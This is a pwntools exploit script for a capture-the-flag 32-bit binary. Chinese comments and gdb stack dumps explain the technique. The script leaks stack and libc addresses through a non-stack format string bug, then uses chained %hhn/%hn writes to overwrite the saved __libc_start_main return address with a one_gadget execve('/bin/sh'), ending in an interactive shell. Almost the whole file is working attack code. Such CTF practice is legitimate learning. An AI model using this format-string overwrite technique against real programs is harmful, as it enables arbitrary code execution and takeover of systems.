from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
def ms(name,addr):
    print(f'{name}---->{hex(addr)}')
def check():
    while True:
        sl(b'King')
        sleep(0.01)
        data = r()
        if data.find(b'King') != -1:
            break


def p(name,add):
    print(f'{name}------>{add}')

gdb.attach(io,'''
b *0x0804853B
b *0x08048547
''')
#pause()
#0x45226 execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4527a execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0364 execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1207 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL



#00:0000│ esp 0xffffd3e0 —▸ 0x804a060 (buf) ◂— 'aaaa\n'
#01:0004│     0xffffd3e4 —▸ 0x8048640 ◂— jno 0x80486b7 /* 'quit' */
#02:0008│     0xffffd3e8 ◂— 0x4
#03:000c│     0xffffd3ec —▸ 0x804857c (play+51) ◂— add esp, 0x10
#04:0010│     0xffffd3f0 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d /* '=====================' */
#05:0014│     0xffffd3f4 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0
#07:001c│     0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop
#08:0020│     0xffffd400 —▸ 0xf7fb3d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
#09:0024│     0xffffd404 ◂— 0x0
#0a:0028│     0xffffd408 —▸ 0xffffd418 ◂— 0x0
#0b:002c│     0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop
#0c:0030│     0xffffd410 —▸ 0xf7fe22b0 (_dl_fini) ◂— endbr32
#0d:0034│     0xffffd414 —▸ 0xffffd430 ◂— 0x1
#0e:0038│     0xffffd418 ◂— 0x0
#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10        ##经过调试发现返回执行的_libc_start_main

#10:0040│     0xffffd420 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#11:0044│     0xffffd424 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#12:0048│     0xffffd428 ◂— 0x0
#13:004c│     0xffffd42c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#14:0050│     0xffffd430 ◂— 0x1
#15:0054│     0xffffd434 —▸ 0xffffd4c4 —▸ 0xffffd631 ◂— '/home/yun/Desktop/fmtxm/playfmt'
#16:0058│     0xffffd438 —▸ 0xffffd4cc —▸ 0xffffd651 ◂— 'SHELL=/bin/bash'
#非栈上的格式化字符串漏洞
#A——-——-----———————B——————————————————C
#栈地址——————————栈数据—————————————数据指向的内容
#思想：先找三级指针
#确定要修改内容的地址比如放libc_start_main_addr
ru(b'=====================')
#泄露栈地址和偏移地址
sl(b'stack%6$pmain%15$p')
#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#addr=u32(io.recvuntil(b'\xf7')[-4:])
ru(b'stack0x')
stack= int(r(8),16)+0x24
ms('stackadd',stack)
ru(b'main0x')
main=int(r(8),16)
ms('mainadd',main)
libcbase= main-0x1aed5
onegetadd=libcbase+0x14482c#+0x14482b#+0xc9bbb
ms('oneget',onegetadd)
#one=main-0x1aed5+0x45226
#需要改三个字节
#>>> hex( 0xf7de2ed5+0x2a351)
#'0xf7e0d226'
#>>>
#一般都有一个三级指针类似于下边这样的：
#A——-——-----———————B——————————————————C
#栈地址——————————栈数据—————————————数据指向的内容

#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0
#确定修改哪个地址里的内容(返回地址，退出程序的时候)
#首先需要确定要将什么地址里的内容修改成什么，比如修改_libc_start_main为oneget
#第一步目的:
#让放_libc_start_main的地址出现在第三级(C)的位置
#0xffffd41c 

#做法：1、在栈上(数据部分)找和放_libc_start_main相似的地址(0xffffd41c)例如：

#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0

#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp,  0x10 
                                                                                 
                                                                                  
                                                                                            
                                                                                                    
                                                                                                    


#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd41c  —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp,  0x10 

#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp,  0x10 
word=stack&0xff
payload1=f'%{word}c%6$hhn\x00'

payload1=payload1.encode()
sl(payload1)
check()

#00:0000│ esp 0xffffd3e0 —▸ 0x804a060 (buf) ◂— 'aaaa\n'
#01:0004│     0xffffd3e4 —▸ 0x8048640 ◂— jno 0x80486b7 /* 'quit' */
#02:0008│     0xffffd3e8 ◂— 0x4
#03:000c│     0xffffd3ec —▸ 0x804857c (play+51) ◂— add esp, 0x10
#04:0010│     0xffffd3f0 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d /* '=====================' */
#05:0014│     0xffffd3f4 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#07:001c│     0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop
#08:0020│     0xffffd400 —▸ 0xf7fb3d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
#09:0024│     0xffffd404 ◂— 0x0
#0a:0028│     0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#0b:002c│     0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop
#0c:0030│     0xffffd410 —▸ 0xf7fe22b0 (_dl_fini) ◂— endbr32
#0d:0034│     0xffffd414 —▸ 0xffffd430 ◂— 0x1
#0e:0038│     0xffffd418 ◂— 0x0
#0f:003c│     0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10


#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#这时候需要对08进行操作



#0a:0028│     0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10


#先修改最后两个字节
word=onegetadd&0xffff

payload2=f'%{word}c%10$hn\x00'

payload2=payload2.encode()
sl(payload2)
check()

#还有一个字节没有修改
#我们还得让stack+2的地址出现在三级指针上

check()

print('stack--->')
print(hex(stack))
word=stack+2
word=word&0xff
print(f'第二次改一个字节word--->{hex(word)}')
payload3=f'%{word}c%6$hhn\x00'
payload3=payload3.encode()
sl(payload3)

sleep(1)

check()
#修改最后一个字节
word=onegetadd&0xffffff
word=word>>16
print(hex(word))
payload4=f'%{word}c%10$hhn\x00'
payload4=payload4.encode()
sl(payload4)
print('修改stack+2的地址结束')

check()



#修复ebp
print(hex(stack))
word=stack-0x14
word=word&0xff
print(hex(word))
print(hex(word))
payload5=f'%{word}c%6$hhn\x00'

payload5=payload5.encode()
sl(payload5)
#check()
#gdb.attach(io,'''
#b *0x0804853B
#''')
#pause()


sl(b'quit\x00')



ii()
